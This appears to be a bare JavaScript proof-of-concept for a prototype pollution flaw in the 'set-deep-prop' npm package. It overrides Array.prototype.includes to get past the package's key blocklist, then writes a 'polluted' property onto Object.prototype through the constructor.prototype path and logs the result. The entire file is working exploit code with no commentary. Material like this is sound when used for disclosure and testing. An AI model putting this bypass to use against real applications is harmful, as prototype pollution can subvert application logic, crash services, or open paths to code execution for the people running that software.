Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const setDeepProp = require('set-deep-prop');
var obj = {};
console.log({}.polluted);
setDeepProp({}, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);